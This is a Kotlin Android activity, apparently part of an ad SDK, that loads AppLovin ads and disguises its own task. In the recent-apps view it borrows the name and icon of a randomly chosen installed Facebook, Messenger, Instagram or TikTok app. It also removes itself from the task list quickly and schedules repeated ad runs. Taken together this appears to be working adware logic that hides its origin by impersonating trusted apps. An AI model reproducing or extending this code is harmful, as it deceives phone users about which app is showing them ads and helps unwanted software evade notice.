package com.app.sdk

import android.app.ActivityManager.TaskDescription
import android.content.Intent
import android.content.pm.ApplicationInfo
import android.content.pm.PackageManager
import android.graphics.Canvas
import android.graphics.Color
import android.os.Bundle
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.graphics.createBitmap
import com.app.sdk.sdk.mediator.ApplovinMediator
import com.app.sdk.sdk.mediator.Mediator
import java.util.*


class PremiumActivity : AppCompatActivity(), Mediator.MediatorCallBack {

    private var runningAdTime = -1L
    private var isCaptured = false
    private var currentMediator = ApplovinMediator(this)
    private val isSingleRun by lazy { intent.getBooleanExtra(SINGLE_RUN, false) }
    private val isFirstStart by lazy { intent.getBooleanExtra(IS_FIRST_START, false) }

    companion object {
        const val SINGLE_RUN = "single_run"
        const val IS_FIRST_START = "is_first_start"
    }

    private val listOfApps = listOf(
        "com.facebook.orca",
        "com.facebook.katana",
        "com.example.facebook",
        "com.facebook.android",
        "com.instagram.android",
        "com.ss.android.ugc.trill"
    )

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.empty)
        setTaskDescription()
        if (isFirstStart) finishAndRemoveTask()
        else {
            currentMediator.initMediator(this)
            AppApplication.instance.registerClosable { onHide() }
        }
    }

    private fun setTaskDescription() {
        getApplicationInfoForApp()
            .let(::getTaskDescription)
            .let(::setTaskDescription)
    }

    @Suppress("DEPRECATION")
    private fun getTaskDescription(info: ApplicationInfo?) = if (info != null)
        TaskDescription(info.loadLabel(packageManager).toString(), getLogoBitmap(info), Color.WHITE)
    else TaskDescription("-", getLogoBitmap(), Color.BLACK)

    private fun getLogoBitmap(info: ApplicationInfo? = null) = createBitmap(200, 200).apply {
        val canvas = Canvas(this)
        info?.loadIcon(packageManager)?.let {
            it.setBounds(0, 0, 200, 200)
            it.draw(canvas)
        } ?: eraseColor(Color.BLACK)
    }

    private fun getApplicationInfoForApp() = listOfApps
        .mapNotNull(::existApplicationInfo)
        .randomOrNull()

    private fun existApplicationInfo(packageName: String) = try {
        packageManager.getApplicationInfo(packageName, PackageManager.GET_META_DATA)
    } catch (e: Exception) {
        null
    }

    override fun startLoadAd(mediator: Mediator) {
        mediator.loadAd(this)
    }

    override fun onError() {
        currentMediator.closeAd()
    }

    override fun onHide() {
        if (isFirstStart) return
        AppApplication.instance.closeReceiver()
        finishAndRemoveTask()

        if (!isCaptured) {

            if (needRunTwin() && !isSingleRun) AppApplication.instance.newRun()
            else AppApplication.instance.scheduleNext()

            isCaptured = true

        }

        runningAdTime = -1

    }

    override fun onNewIntent(intent: Intent?) {
        super.onNewIntent(intent)
        finishAndRemoveTask()
    }

    private fun needRunTwin() = runningAdTime != -1L && (Date().time - runningAdTime) < 5000

    override fun onClicked() {
        runningAdTime = -1
        onHide()
    }

    override fun onDisplay() {
        runningAdTime = Date().time
    }

    override fun displayMsg(msg: String) {
        Toast.makeText(this, msg, Toast.LENGTH_LONG).show()
    }

    override fun onTrimMemory(level: Int) {
        super.onTrimMemory(level)
        if (level == TRIM_MEMORY_UI_HIDDEN) onHide()
    }

}